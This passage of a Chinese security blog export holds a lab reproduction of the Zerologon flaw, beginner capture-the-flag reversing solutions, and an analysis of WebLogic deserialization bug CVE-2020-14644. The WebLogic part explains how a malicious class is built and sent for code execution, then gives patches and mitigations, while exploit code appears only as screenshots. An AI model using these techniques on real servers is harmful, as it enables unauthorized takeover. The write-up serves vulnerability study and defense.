<p>参考宽字节安全的推文：<a href="https://mp.weixin.qq.com/s/MSLbzg2hCoTSVTtEIxxpNQ">https://mp.weixin.qq.com/s/MSLbzg2hCoTSVTtEIxxpNQ</a></p>
<p><a href="https://asciinema.org/a/359607">https://asciinema.org/a/359607</a></p>
<a id="more"></a>

<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915162012996.png" alt="image-20200915162012996"></p>
<h5 id="0x1-搭建一个windows的域环境"><a href="#0x1-搭建一个windows的域环境" class="headerlink" title="0x1 搭建一个windows的域环境"></a>0x1 搭建一个windows的域环境</h5><p>搭建参考：<a href="https://blog.csdn.net/wwl012345/article/details/88934571">https://blog.csdn.net/wwl012345/article/details/88934571</a></p>
<p>发现电脑里有一个win2008r2的虚拟机，就用这个了</p>
<p>更改IP和DNS</p>
<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915161742282.png" alt="image-20200915161742282"></p>
<p>添加角色</p>
<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915161849769.png" alt="image-20200915161849769"></p>
<p>根据提示，运行dcpromo.exe添加DNS服务器</p>
<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915161801701.png" alt="image-20200915161801701"></p>
<p>记录域名</p>
<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915161902861.png" alt="image-20200915161902861"></p>
<p>此时，域环境已经搭建完成</p>
<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915161930572.png" alt="image-20200915161930572"></p>
<p>以防万一我还看了下服务里netlogon有没有开</p>
<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915161950769.png" alt="image-20200915161950769"></p>
<h5 id="0x2-使用kali运行poc脚本进行攻击"><a href="#0x2-使用kali运行poc脚本进行攻击" class="headerlink" title="0x2 使用kali运行poc脚本进行攻击"></a>0x2 使用kali运行poc脚本进行攻击</h5><p>先装一个kali虚拟机，好久没装了中间还出现了点小问题</p>
<p>装完Kali之后，更改下ip和dns服务器，新建一个配置1</p>
<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915180721906.png" alt="image-20200915180721906"></p>
<p>然后安装impacket,参考：<a href="https://www.freebuf.com/sectool/175208.html">https://www.freebuf.com/sectool/175208.html</a></p>
<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915180851531.png" alt="image-20200915180851531"></p>
<p>装好之后拷入poc脚本</p>
<p>之后是导入各种模块和无限的debug…..修改了下脚本</p>
<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915180942451.png" alt="image-20200915180942451"></p>
<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915180900178.png" alt="image-20200915180900178"></p>
<p>运行脚本，复现成功：</p>
<p><img src="/2020/09/06/0x02CVE-2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200915180918659.png" alt="image-20200915180918659"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>netlogon</tag>
        <tag>域</tag>
      </tags>
  </entry>
  <entry>
    <title>0x02xctf新手训练题</title>
    <url>/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/</url>
    <content><![CDATA[<h4 id="xctf新手训练题"><a href="#xctf新手训练题" class="headerlink" title="xctf新手训练题"></a>xctf新手训练题</h4><a id="more"></a>

<h5 id="0x1-open-source"><a href="#0x1-open-source" class="headerlink" title="0x1 open-source"></a>0x1 open-source</h5><p>下载文件后可以直接看源码</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022173337438.png" alt="image-20201022173337438"></p>
<p>要求是输入4个参数，第一个参数为’0xcafe’，第二个参数是符合判定条件的int值，第三个参数是’h4cky0u’，然后进行一些数据操作得到hash，并用十六进制方式输出（%x）</p>
<p>编写脚本实现，得到flag为0xc0ffee</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201021172112641.png" alt="image-20201021172112641"></p>
<h5 id="0x2-simple-unpack"><a href="#0x2-simple-unpack" class="headerlink" title="0x2 simple-unpack"></a>0x2 simple-unpack</h5><p>提示是加了壳的二进制文件，查壳</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022173809443.png" alt="image-20201022173809443"></p>
<p>一开始不知道怎么脱二进制文件的壳，参考：<a href="https://bbs.pediy.com/thread-157645.htm">https://bbs.pediy.com/thread-157645.htm</a></p>
<p>到软件中提示的地址下载脱壳程序进行脱壳（<a href="https://github.com/upx/upx/releases%EF%BC%89">https://github.com/upx/upx/releases）</a></p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022173853002.png" alt="image-20201022173853002"></p>
<p>脱壳成功后用IDA查看，即得到flag</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022174038951.png" alt="image-20201022174038951"></p>
<h5 id="0x3-logmein"><a href="#0x3-logmein" class="headerlink" title="0x3 logmein"></a>0x3 logmein</h5><p>查看下载的文件</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022174115535.png" alt="image-20201022174115535"></p>
<p>用IDA找到对应关键字进行分析</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022174143070.png" alt="image-20201022174143070"></p>
<p>重点函数：</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201023171541380.png" alt="image-20201023171541380"></p>
<p>编写脚本即可</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201023171351848.png" alt="image-20201023171351848"></p>
<p>注意：小端模式</p>
<h5 id="0x4-insanity"><a href="#0x4-insanity" class="headerlink" title="0x4 insanity"></a>0x4 insanity</h5><p>下载文件后直接编辑器就能查看到flag</p>
<h5 id="0x5-getit"><a href="#0x5-getit" class="headerlink" title="0x5 getit"></a>0x5 getit</h5><p>IDA中反编译</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022174234603.png" alt="image-20201022174234603"></p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022174338459.png" alt="image-20201022174338459"></p>
<p>可以看到t就是flag，我们需要知道？的数值，编写脚本即可得到flag</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022111119084.png" alt="image-20201022111119084"></p>
<p>此题注意：python中字符串是不可以直接操作修改的，可以先改为列表，然后重新生成</p>
<h5 id="0x6-python-trade"><a href="#0x6-python-trade" class="headerlink" title="0x6 python-trade"></a>0x6 python-trade</h5><p>.pyc后缀的文件，直接用EasyPythonDecompiler解了，获得源码</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/24CD274DE2E7A49AC28DC75BFF631FA2.png" alt="24CD274DE2E7A49AC28DC75BFF631FA2"></p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/CF034599DBEAC7285F7E5C9C744EBB6D.png" alt="CF034599DBEAC7285F7E5C9C744EBB6D"></p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/BB56738DB65555D9FF8F1424320439CB.png" alt="BB56738DB65555D9FF8F1424320439CB"></p>
<p>可以看到操作：对输入的字符串进行自定义的encode操作然后用base64加密</p>
<p>编写脚本解码即得flag</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022113051197.png" alt="image-20201022113051197"></p>
<h5 id="0x7-re1"><a href="#0x7-re1" class="headerlink" title="0x7 re1"></a>0x7 re1</h5><p>放进IDA查看</p>
<p>查看主函数，可以看到只要输入的字符串和v5相同就可以了，找到对应v5的值即可得flag</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022183057868.png" alt="image-20201022183057868"></p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022175340918.png" alt="image-20201022175340918"></p>
<h5 id="0x8-Hello-CTF"><a href="#0x8-Hello-CTF" class="headerlink" title="0x8 Hello,CTF"></a>0x8 Hello,CTF</h5><p>用IDA打开，找到主要函数</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022175837176.png" alt="image-20201022175837176"></p>
<p>从下面的循环判定值为17和上面v13的长度为34猜测出两位代表一个字符</p>
<p>十六进制转ASCII即可得flag</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022175959301.png" alt="image-20201022175959301"></p>
<h5 id="0x9-no-string-attached"><a href="#0x9-no-string-attached" class="headerlink" title="0x9 no-string-attached"></a>0x9 no-string-attached</h5><p>IDA中查看主函数</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180039861.png" alt="image-20201022180039861"></p>
<p>进入每个函数看看</p>
<p>先看banner()</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180101213.png" alt="image-20201022180101213"></p>
<p>就是打印一些东西，查看对应打印的数值（unk_80488B0和8048960）</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180251090.png" alt="image-20201022180251090"></p>
<p>可以看到是两个字符串，就是一些欢迎的信息之类的</p>
<p>查看下一个，也是打印一些信息，需要你输入字符串</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180356018.png" alt="image-20201022180356018"></p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180449834.png" alt="image-20201022180449834"></p>
<p>再看下一个，是主函数了，只要输入的函数和s2相同即可，s2是两个输入进行decrypt操作后得到的值</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180527832.png" alt="image-20201022180527832"></p>
<p>看decrypt,对两个宽字节进行了操作。编写脚本实现功能即可得flag</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180623954.png" alt="image-20201022180623954"></p>
<p> <img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022141847145.png" alt="image-20201022141847145"></p>
<h5 id="0xA-csaw2013reversing2"><a href="#0xA-csaw2013reversing2" class="headerlink" title="0xA csaw2013reversing2"></a>0xA csaw2013reversing2</h5><p>IDA中看主函数</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180506157.png" alt="image-20201022180506157"></p>
<p>通过运行程序，发现并不会进入if的判定。</p>
<p>lpMem+1就是我们需要知道的乱码消息</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181008895.png" alt="image-20201022181008895"></p>
<p>可以知道通过memcpy_s操作将unk_409B10的数据给了lpMem</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181020276.png" alt="image-20201022181020276"></p>
<p>查看sub_401000</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181112925.png" alt="image-20201022181112925"></p>
<p>是对lpMem进行了一些操作的，猜测是由于并没有运行，所以出现乱码</p>
<p>用IDA动态调试（debugger），下断点</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181352168.png" alt="image-20201022181352168"></p>
<p>跳过进入判定后的ExitProcess()，直接跳到下面弹出messageboxA的地方，就能得到flag了</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181317768.png" alt="image-20201022181317768"></p>
<h5 id="0xB-maze"><a href="#0xB-maze" class="headerlink" title="0xB maze"></a>0xB maze</h5><p>看题目就知道是一个迷宫题</p>
<p>IDA中找主函数</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181455862.png" alt="image-20201022181455862"></p>
<p>看到这四个不同函数的判断，猜测应该就是上下左右了</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181522773.png" alt="image-20201022181522773"></p>
<p>分别点进去查看，得知’O’为左，’o’为右，’.’为上，’0’为下，并且在函数中有规定了8这个边界值</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181719854.png" alt="image-20201022181719854"></p>
<p>接下来找迷宫和终点</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181743142.png" alt="image-20201022181743142"></p>
<p>通过最终判定的条件，可以知道终点是’#’</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181833592.png" alt="image-20201022181833592"></p>
<p>601060就是需要找的迷宫</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022183115702.png" alt="image-20201022183115702"></p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022183129721.png" alt="image-20201022183129721"></p>
<p>在HEX界面查看</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181923615.png" alt="image-20201022181923615"></p>
<p>根据边界值8重新排列，23就是终点，只走20即可得flag</p>
<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022182143651.png" alt="image-20201022182143651"></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title>0x03CVE-2020-14644 weblogic iiop反序列化漏洞分析</title>
    <url>/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="CVE-2020-14644-weblogic-iiop反序列化漏洞分析"><a href="#CVE-2020-14644-weblogic-iiop反序列化漏洞分析" class="headerlink" title="CVE-2020-14644 weblogic iiop反序列化漏洞分析"></a>CVE-2020-14644 weblogic iiop反序列化漏洞分析</h3><p>参考：</p>
<p>0x1 <a href="https://my.oschina.net/u/4280983/blog/4477476">https://my.oschina.net/u/4280983/blog/4477476</a></p>
<p>0x2 宽字节的推文</p>
<a id="more"></a>

<h4 id="0x1-漏洞介绍"><a href="#0x1-漏洞介绍" class="headerlink" title="0x1 漏洞介绍"></a>0x1 漏洞介绍</h4><h5 id="0x01-WebLogic组件"><a href="#0x01-WebLogic组件" class="headerlink" title="0x01 WebLogic组件"></a>0x01 WebLogic组件</h5><p>WebLogic是美国Oracle公司出品的一个application server，是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器，适用于云环境和传统环境的应用服务器组件。</p>
<h5 id="0x02-漏洞简介"><a href="#0x02-漏洞简介" class="headerlink" title="0x02 漏洞简介"></a>0x02 漏洞简介</h5><p>Oracle官方在2020年7月份发布的最新安全补丁中披露了此漏洞。此漏洞CVSS评分9.8，<strong>受影响的版本是12.2.1.3.0、12.2.1.4.0和14.1.1.0.0</strong>。该漏洞允许未经身份验证的攻击者通过 IIOP , T3 进行网络访问，攻击者成功攻击此漏洞可能导致Oracle WebLogic Server被接管。</p>
<h4 id="0x2-漏洞分析"><a href="#0x2-漏洞分析" class="headerlink" title="0x2 漏洞分析"></a>0x2 漏洞分析</h4><h5 id="0x01-相关知识"><a href="#0x01-相关知识" class="headerlink" title="0x01 相关知识"></a>0x01 相关知识</h5><h6 id="JDK的classloader类和defineClass方法"><a href="#JDK的classloader类和defineClass方法" class="headerlink" title="JDK的classloader类和defineClass方法"></a>JDK的classloader类和defineClass方法</h6><p>​    一个类在被使用之前，会经历class文件生成—&gt;加载—&gt;连接—&gt;初始化等阶段。其中加载阶段主要完成三件事：1、通过类的全限定名来获取定义次类的二进制字节流，2、将该二进制字节流定义的静态数据结构转换成方法区的运行时数据结构，3、在内存中生成一个代表该类的Class对象，供外部通过该对象来获取类的元数据信息。</p>
<p>​    JDK中的ClassLoader类中有个方法是defineClass，可以根据类全限定名和类的字节数组，加载一个类并返回对应的Class对象到 JVM（Java Virtual Machine）中。</p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110556771.png" alt="image-20201015110556771"></p>
<p>如上图所示，如果参数’name’（类名）和’b’（类文件的二进制数据）可控，理论上我们可以加载任何类，我们可以通过该方法，构造符合class格式的bytes数组作为类去加载。（注意：1、一般情况下，通过defineClass加载的类不允许同名，2、一个类中的类名name和类字节数组b中的类名要对应）</p>
<h6 id="javassist"><a href="#javassist" class="headerlink" title="javassist"></a>javassist</h6><p>​    javassist是一个开源的分析、编辑和创建Java字节码的类库。它提供了更高级的API，执行效率相对ASM较差，但无需掌握字节码指令的知识，对使用者要求较低。它直接使用java编码的形式，不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。</p>
<h5 id="0x02-漏洞代码分析"><a href="#0x02-漏洞代码分析" class="headerlink" title="0x02 漏洞代码分析"></a>0x02 漏洞代码分析</h5><p>该漏洞的原理是在反序列化时，通过使用defineClass方法，加载恶意类。</p>
<p>关键类：com.tangosol.internal.util.invoke.RemoteConstructor</p>
<p>在RemoteConstructor类中，构造实例的代码如下：</p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014111222573.png" alt="image-20201014111222573"></p>
<p>其中RemotableSupport类，可以理解为是coherence自定义的Classloader，在其中实现了defineClass，具有加载类的功能。查看其中的realize方法：</p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110307308.png" alt="image-20201015110307308"></p>
<p>先执行this.registerIfAbsent(constructor.getDefinition())方法</p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110341915.png" alt="image-20201015110341915"></p>
<p>RemotableSupport中定义了 Map 类型的 f_mapDefinitions 的变量充当缓存，每次调用realize时就会先在缓存中查找ClassDefinition。</p>
<p>执行完成后，调用getRemotableClass方法，获取clz。查看ClassDefinition类</p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014112030482.png" alt="image-20201014112030482"></p>
<p>可以看到getRemotableClass返回m_clz,并且m_clz是用transient修饰的（transient的含义：将不需要序列化的属性前添加关键字transient，序列化对象的时候，这个属性就不会被序列化，最终变量为NULL）</p>
<p>所以clz为NULL。于是在realize方法中，就会进入if分支，调用defineClass加载恶意类字节码。</p>
<p>RemotableSupport 继承了ClassLoader，所以它的 defineClass 就是调用了父类的 defineClass来加载类。</p>
<p>需要注意的是BinClassName变量的命名，使用的是ClassIdentity类中的getName方法</p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110410957.png" alt="image-20201015110410957"></p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110448486.png" alt="image-20201015110448486"></p>
<p>ClassIdentity类中的构造方法是将clazz作为参数，然后提取该类的一些特征信息，如Basename等。其中getName函数可以简化为：getName() = package + “/“ + baseName + “$” + version</p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014105230694.png" alt="image-20201014105230694"></p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014105430256.png" alt="image-20201014105430256"></p>
<p>所以 ClassIdentity 中的字节数组 byte[] 中的对应的 Class 的类名必须为 package + “.” + baseName + “$” + version，否则可能会加载失败。</p>
<p>继续分析realize方法，加载类之后调用了createInstance方法</p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201014152406910.png" alt="image-20201014152406910"></p>
<p>aoArgs作为参数进行实例化对象，所以将恶意代码写在构造方法中，实例化之后就会执行恶意代码。</p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110636109.png" alt="image-20201015110636109"></p>
<p> 所以只要构造一个带有包名类的恶意代码写进构造函数中，通过 javassist动态修改类名，将原类名加上 $ 和 version 值对应，通过iiop协议和反序列化发送给weblogic服务器，即可实现漏洞利用</p>
<h4 id="0x3-漏洞复现"><a href="#0x3-漏洞复现" class="headerlink" title="0x3 漏洞复现"></a>0x3 漏洞复现</h4><h5 id="0x01-漏洞利用-弹计算器"><a href="#0x01-漏洞利用-弹计算器" class="headerlink" title="0x01 漏洞利用-弹计算器"></a>0x01 漏洞利用-弹计算器</h5><p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110723660.png" alt="image-20201015110723660"></p>
<h5 id="0x02-漏洞利用-信息回显"><a href="#0x02-漏洞利用-信息回显" class="headerlink" title="0x02 漏洞利用-信息回显"></a>0x02 漏洞利用-信息回显</h5><p>1、开启weblogic服务器</p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110854978.png" alt="image-20201015110854978"></p>
<p>2、查看weblogic服务器的网络配置信息</p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201015110937437.png" alt="image-20201015110937437"></p>
<p>3、在攻击机上，编写特制的恶意类（写入weblogic服务器的Ip和weblogic服务的端口以及攻击命令），打包jar包，运行，就可以直接获取到weblogic服务器的信息</p>
<p><img src="/2020/09/07/0x03CVE-2020-14644-weblogic-iiop%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201109171158094.png" alt="image-20201109171158094"></p>
<h4 id="0x4-漏洞防护方案"><a href="#0x4-漏洞防护方案" class="headerlink" title="0x4 漏洞防护方案"></a>0x4 漏洞防护方案</h4><h5 id="0x01-官方方案："><a href="#0x01-官方方案：" class="headerlink" title="0x01 官方方案："></a>0x01 官方方案：</h5><p>官方已经针对此漏洞发布补丁，请受影响的用户参考以下链接安装补丁更新：</p>
<p><a href="https://www.oracle.com/security-alerts/cpujul2020.html">https://www.oracle.com/security-alerts/cpujul2020.html</a></p>
<h5 id="0x02-临时解决方案："><a href="#0x02-临时解决方案：" class="headerlink" title="0x02 临时解决方案："></a>0x02 临时解决方案：</h5><h6 id="关闭IIOP协议："><a href="#关闭IIOP协议：" class="headerlink" title="关闭IIOP协议："></a>关闭IIOP协议：</h6><p>在WebLogic控制台中，选择“服务”-&gt;”AdminServer”-&gt;”协议”，取消“启用IIOP”的勾选。并重启WebLogic项目，使配置生效。</p>
<h6 id="控制T3服务："><a href="#控制T3服务：" class="headerlink" title="控制T3服务："></a>控制T3服务：</h6><p>在WebLogic界面中选择安全-筛选器，在下方出现的界面中找到“连接筛选器”，在里面输入：security.net.ConnectionFilterImpl，然后在连接筛选器规则中输入：127.0.0.1 * * allow t3 t3s，0.0.0.0/0 * * deny t3 t3s。最后保存并重启服务器即可生效。</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>weblogic</tag>
      </tags>
  </entry>
  <entry>
    <title>0x03Xctf进阶刷题-1</title>
    <url>/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/</url>
    <content><![CDATA[<h4 id="Xctf进阶刷题-1"><a href="#Xctf进阶刷题-1" class="headerlink" title="Xctf进阶刷题-1"></a>Xctf进阶刷题-1</h4><a id="more"></a>

<h5 id="0x01shuffle"><a href="#0x01shuffle" class="headerlink" title="0x01shuffle"></a>0x01shuffle</h5><p>IDA分析即可看到flag</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201028100237540.png" alt="image-20201028100237540"></p>
<h5 id="0x02-reversing-x64elf（python二维数组）"><a href="#0x02-reversing-x64elf（python二维数组）" class="headerlink" title="0x02 reversing-x64elf（python二维数组）"></a>0x02 reversing-x64elf（python二维数组）</h5><p>IDA分析关键函数</p>
<p>可以看到是对输入的值进行了sub_4006FD函数操作然后进行判定</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027174007904.png" alt="image-20201027174007904"></p>
<p>进入函数查看，可以看到是一个计算操作</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027174043472.png" alt="image-20201027174043472"></p>
<p>编写脚本即可得flag</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027175341690.png" alt="image-20201027175341690"></p>
<p><strong>注意：python中二维数组的编写</strong></p>
<h5 id="0x03-guess-the-number（jar包逆向）"><a href="#0x03-guess-the-number（jar包逆向）" class="headerlink" title="0x03 guess-the-number（jar包逆向）"></a>0x03 guess-the-number（jar包逆向）</h5><p>是一个java程序，直接解压jar包，查看.class源码，可以看到是对两个字符串进行操作</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027183024987.png" alt="image-20201027183024987"></p>
<p>一开始想要用python编写脚本的，但是xor函数涉及到了Biginter，所以直接改下代码用Java跑</p>
